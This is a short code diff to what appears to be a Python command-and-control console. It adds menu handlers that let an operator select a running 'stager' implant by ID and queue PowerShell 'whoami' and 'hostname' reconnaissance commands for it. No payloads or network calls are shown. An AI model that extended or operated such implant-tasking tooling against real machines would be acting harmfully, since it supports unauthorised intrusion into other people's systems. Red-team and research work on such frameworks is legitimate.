@@ -828,6 +828,31 @@ class mymainclass():
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.PSJOB.format("Invoke-myclient"))
                     continue
 
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_WHOAMI:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.WHOAMI)
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_HOSTNAME:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.HOSTNAME)
+                    continue
+
+
             if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
                 # menu switch
                 if command_id == self.__t_myconstant.CMD_BACK:
